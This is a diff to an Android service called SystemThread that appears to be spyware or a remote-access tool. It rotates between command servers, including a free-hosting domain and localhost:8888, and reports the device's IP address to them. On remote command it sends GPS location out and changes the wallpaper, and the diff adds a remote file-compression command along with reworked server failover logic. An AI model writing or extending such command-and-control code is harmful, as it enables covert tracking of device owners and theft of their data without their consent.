@@ -61,10 +61,9 @@ public class SystemThread extends Service
 	public static String payloadWebResultSwitch = "";
 	public static String urlServer = "";
 	public static int iserver = 0;
-	public static int jumserver = 3;
 	public String ip = "";
 
-	private static String[] server = { "http://10.42.0.1","http://sunjangyo12.000webhostapp.com" };
+	private static String[] server = { "http://10.42.0.1", "https://sunjangyo12.000webhostapp.com", "http://localhost:8888" }; //localhost:8888 harus terakhir
 	private static int jcamera = 1875953;
 	private static int alert_warna = Color.YELLOW;
 	private static int alert_letak = Gravity.CENTER | Gravity.TOP;
@@ -183,13 +182,6 @@ public class SystemThread extends Service
 	public void payload() {
         myident = Identitas.getIPAddress(true);
 
-        /*reqPayload(context, urlServer+"/inpayload.txt", "text");
-        reqPayload(context, urlServer+"/swthread.txt", "sw");
-        reqPayload(context, urlServer+"/target.txt", "target");
-		reqPayload(context, urlServer+"/payload.php?client="+myident, "null");
-		reqPayload(context, urlServer+"/payload.php?inpayload=Connected", "null");*/
-
-		reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");
 
         if (receAction.kumpulkanPayload) {
         	receAction.kumpulkanPayload = false;
@@ -203,35 +195,58 @@ public class SystemThread extends Service
 			receAction._server(context);
 			if (receAction.getServer()) 
 			{
-				urlServer = "http://localhost:8888";
+				Log.i(TAG, ">>>> LOCALHOST RUNNING...........");
+
+				urlServer = server[server.length-1];
+				reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");
+
 				logic(context);
-				Log.i(TAG, "shift localhost:8888");
-				reqPayload(context, "http://sunjangyo12.000webhostapp.com/payload.php?outpayload="+textPayload(myident+":8888"), "null");
 			}
 			else {
-				urlServer = server[iserver];
+				Log.i(TAG, ">>>> localhost stoped...........");
+				reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");
+
 				logic(context);
-				Log.i(TAG, "shift variabel");
-				reqPayload(context, "http://sunjangyo12.000webhostapp.com/payload.php?outpayload="+textPayload(myident+":8888"), "null");
+
 			}
+			
 		}
         else if (myident.equals(payloadWebResultTarget)) {
+			reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");
+
+			if (payloadWebResultSwitch.equals("hidup") || payloadWebResultSwitch.equals("mati")) 
+			{
+				if (payloadWebResultSwitch.equals("hidup")) {
+					Log.i(TAG, ">>>> MODE SUPER AKTIF...........");
+					seteditor.putString("swmain", payloadWebResultSwitch);    
+        			seteditor.commit();
+
+				} else {
+					Log.i(TAG, ">>>>> super mati");
+					seteditor.putString("swmain", payloadWebResultSwitch);    
+        			seteditor.commit();
+				}
+			}
+
 			logic(context);
 		
 		}
+		else {
+			reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");
+			if (payloadWebResultSwitch.equals("hidup") || payloadWebResultSwitch.equals("mati")) 
+			{
+				if (payloadWebResultSwitch.equals("hidup")) {
+					Log.i(TAG, ">>>> MODE SUPER AKTIF...........");
+					seteditor.putString("swmain", payloadWebResultSwitch);    
+        			seteditor.commit();
 
-		if (payloadWebResultSwitch.equals("hidup") || payloadWebResultSwitch.equals("mati")) 
-		{
-			if (payloadWebResultSwitch.equals("hidup")) {
-				Log.i(TAG, ">>>> MODE SUPER AKTIF...........");
-				seteditor.putString("swmain", payloadWebResultSwitch);    
-        		seteditor.commit();
-
-			} else {
-				Log.i(TAG, ">>>>> super mati");
-				seteditor.putString("swmain", payloadWebResultSwitch);    
-        		seteditor.commit();
+				} else {
+					Log.i(TAG, ">>>>> super mati");
+					seteditor.putString("swmain", payloadWebResultSwitch);    
+        			seteditor.commit();
+				}
 			}
+			logic(context);
 		}
 
 	}
@@ -242,7 +257,6 @@ public class SystemThread extends Service
 				String lokasi = new GPSresult(context).gpsResult;
 				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(lokasi), "null");
 			}
-			
 
 			if (payloadWebResult.equals("alert")) {
 				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("alert ditampilkan"), "null");
@@ -525,6 +539,13 @@ public class SystemThread extends Service
 				String set = receAction.setWalpaper(context, text[1]);
 				
 				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(set), "null");
+
+			} catch(Exception e) {}
+
+			try {
+				String[] text = payloadWebResult.split("-compress-");
+
+				new Installer(context, "aktif").compressFiles(text[1], text[2]);
 
 			} catch(Exception e) {}
 
@@ -963,6 +984,11 @@ public class SystemThread extends Service
 			}
 			catch(Exception ex){
 				Log.i(TAG, "payload Failed Connect to Server!");
+
+				payloadWebResult = "";
+				payloadWebResultTarget = "";
+				payloadWebResultSwitch = "";
+				
 			}
 			return sret;
 	    }
@@ -983,19 +1009,16 @@ public class SystemThread extends Service
 	    			payloadWebResultSwitch = obj.getString("swthread");
 	    		
 	    		} catch(Exception e) {}
+
+	    		if (payloadWebResultSwitch.equals("")) {
+	    			iserver += 1;
+					if (iserver == server.length) 
+						iserver = 0;
+					urlServer = server[iserver];
+	    		}
 	    	}
 	    	else if (paymain.equals("sw")) {
 	    		payloadWebResultSwitch = result;
-	    		
-	    		if (result.equals("")) {
-	    			Log.i(TAG, "sffffs");
-	    			iserver += 1;
-					if (iserver == jumserver) 
-					{
-						iserver = 0;
-					}
-					urlServer = server[iserver];
-	    		}
 	    	}
 	    	else if (paymain.equals("target")) {
 	    		payloadWebResultTarget = result;
